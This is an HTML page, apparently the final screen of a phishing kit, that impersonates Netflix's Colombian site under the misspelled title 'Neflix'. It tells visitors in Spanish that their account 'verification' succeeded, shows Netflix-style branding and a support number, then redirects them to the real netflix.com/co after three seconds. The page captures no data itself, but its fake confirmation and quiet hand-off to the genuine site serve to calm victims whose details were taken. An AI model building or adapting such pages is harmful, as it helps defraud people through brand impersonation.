<html>
    <head>
        <title>Neflix</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="icon" href="../../img/icono.ico" type="image/x-icon">
        <script type="text/javascript" src="../../js/jquery-3.6.0.min.js"></script>      
        <link href="../../css/style-white.css" rel="stylesheet">
        <link href="../../css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../../js/functions.js"></script>      
        

        <script type="text/javascript">
            function ventana_final(){
                window.location.href = "https://www.netflix.com/co/";
            }

            setTimeout(ventana_final, 3000);            
        </script> 


        <script type="text/javascript">  



            $(document).ready(function() {   
                $(".mensaje-error").css("margin-left","+=100");
                $(".mensaje-error").animate({"margin-left":"-=100","opacity":"1"}, 600, function() {
                    $(".mensaje-error").css("margin","0 auto");
                });

                $("#btn-p1-sgt").click(function(){
                    $(".mensaje-error").animate({"margin-left":"-=100","opacity":"0"}, 400, function() {
                        window.location.href = "https://www.netflix.com/co/";
                    });
                });
            });    
        </script>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <table cellpadding="0" cellspacing="0" border="0" width="100%">
                    <tr>
                        <td valign="middle" align="left"><img src="../../img/logo.png" width="170"></td>
                        <td valign="middle" align="right" class="btn-cerrar">Cerrar sesión</td>
                    </tr>                    
                </table>
            </div>
            <div class="mensaje-error">
                <div class="container-msg">
                    <img src="../../img/icon-listo.png" width="62" style="margin-bottom: 30px;">
                    
                    <div class="titulo-negro">Verificación exitosa</div>
                    <br>
                    <div class="texto-negro">Continúa disfrutando de tus películas y series favoritas.</div>  
                    <button class="btn btn-rojo esp-btn" id="btn-p1-sgt" type="submit">Finalizar</button>                  
                </div>
            </div>

            <div class="footer">
                <div class="container-foot">
                    ¿Preguntas? Llama al <span class="telefono">01 800 917 1564</span>
                    <br><br>
                    <table cellpadding="0" cellspacing="0" width="100%" id="t1">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>
                            </td>
                            <td>
                                <div class="menu-footer">Términos de uso</div>
                            </td>
                            <td>
                                <div class="menu-footer">Privacidad</div>
                            </td>
                        </tr>
                    </table>

                    <table cellpadding="0" cellspacing="0" width="100%" id="t2">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>
                            </td>
                            <td>
                                <div class="menu-footer">Términos de uso</div>
                                <div class="menu-footer">Privacidad</div>
                            </td>                            
                        </tr>
                    </table>

                    <table cellpadding="0" cellspacing="0" width="100%" id="t3">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                                <div class="menu-footer">Privacidad</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>                           
                                <div class="menu-footer">Términos de uso</div>                                
                            </td>                            
                        </tr>
                    </table>
                    <br>
                    <select style="background-color: #fff;color: #737373;padding: 9px;">
                        <option>Español</option>
                        <option>English</option>
                    </select>
                </div>
            </div>
        </div>
    </body>
</html>